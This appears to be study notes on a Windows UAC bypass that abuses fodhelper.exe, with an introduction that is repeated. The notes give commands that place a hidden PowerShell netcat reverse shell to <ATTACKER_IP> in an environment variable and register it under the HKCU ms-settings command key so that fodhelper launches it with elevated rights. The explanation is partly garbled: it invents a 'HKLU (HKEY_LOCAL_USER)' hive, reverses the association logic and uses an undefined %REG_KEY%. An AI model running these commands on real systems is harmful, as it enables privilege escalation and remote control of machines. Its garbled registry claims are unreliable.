## Fodhelper
```
Fodhelper
Fodhelper.exe is one of Windows default executables in charge of managing Windows optional features, including additional languages, applications not installed by default, or other operating-system characteristics. Like most of the programs used for system configuration, fodhelper can auto elevate when using default UAC settings so that administrators won’t be prompted for elevation when performing standard administrative tasks. While we’ve already taken a look at an autoElevate executable, unlike msconfig, fodhelper can be abused without having access to a GUI.

Fodhelper
Bypass using Fodhelper: 
fodhelper.exe is a Windows default executable that is required for managing optional Windows features, additional languages, etc.
It is also an automatically executable program.
This means that the administrator will not be prompted by UAC to perform elevated tasks. 
We can performed if there are restrictions to GUI.  

Start Run and type “fodhelper.exe” to open Fodhelper. 

For example, say if we are opening a html file. 
The windows will go to registry > HKEY_CLASSES_ROOT to check for which client application is must be used to open it. 
The command is defined in ‘shell\open\command’ subkey i.e., the iexplore.exe. 

We can then change the data of the value named ‘DelegateExecute’ in the registry within the “HKCU\Software\Classes\ms-settings\Shell\Open\command” for the fodhelper to replace with our own script to get a reverse shell. 
Let’s say an attacker managed to attack the machine and get an administrator level account, but if UAC is restricting from performing an elevated execution.  

C:\> set SHELL="powershell -windowstyle hidden C:\Tools\nc64.exe <ATTACKER_IP> 443"

We can create a malicious script to provide a reverse shell back to the attacker machine and store it in an Environment variable.

C:\> reg add “HKCU\Software\Classes\ms-settings\Shell\Open\command” /v "DelegateExecute" /d "" /f

Create an empty value named “DelegateExecute” inside the registry key “HKCU\Software\Classes\ms-settings\Shell\Open\command”.

So that the system-wide association can be used at HKLU (HKEY_LOCAL_USER) instead of user-specific association based at HKCU (HKEY_CURRENT_USER). In other words

C:\> reg add %REG_KEY% /d %SHELL% /f

We can check by running ‘Registry Editor’ in windows to check if the key values are updated in ‘HKCU\Software\Classes\ms-settings\Shell\Open\command’. 
